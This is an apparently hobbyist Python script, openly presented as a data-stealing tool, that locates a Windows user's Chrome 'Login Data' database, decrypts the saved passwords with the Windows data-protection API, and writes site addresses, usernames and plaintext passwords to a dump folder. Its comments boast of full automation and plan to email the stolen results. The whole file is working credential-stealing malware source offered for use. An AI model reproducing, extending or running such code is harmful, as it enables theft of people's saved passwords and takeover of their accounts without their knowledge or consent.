#Works on windows
import os
from os import getenv
import sqlite3
import win32crypt

print("""
Stealing Ya' Data since 2019


                       El Getaway Car
       	    	    _____________________
                   /	        |	  \ .
                  /             |          \ .
                 / _____________|__________ \ .
    ____________|      \        |    \       |_____________
    |       ____|____           |          ________       |
    |      /         \          |         /        \      |
    |_____/    | |    \ ________________ /   |  |   \_____|
          \    | |    /                  \   |  |   /
           \_________/                    \________/

Remastered by TheStandardPancake, credit to bluedangerforyou for writing the original code

""")
#essentially I cut out any code that was not necessary, and optimised the file locating methods so that there is no longer any need for manual interaction (now a fully automated process)
#I alson plan on creating a feature to then email the results so that that as soon as the program is run, that is the end of all you need to do, the data is yours.

#setting up the file to dump info
usb = os.path.abspath(__file__)
os.makedirs(os.path.join(usb + "Chrome Dump"))
path = os.path.join(usb + "Chrome Dump")

#labels for easy use in the file
username1 = "Username: "
siteId = "Site ID: "
password_field = "Password: "

#The magic happens
f = open(os.path.join(path,"passwordsusers.txt"), "w")
conn = sqlite3.connect(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
	password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
	if password:
		f.writelines(siteId + str(result[0]) + '\n' + username1 + str(result[1]) + '\n' + password_field + str(password) + '\n' + '--------------------------------' + '\n')
f.close()
print("Congrats, your data is now stolen, LOL!")
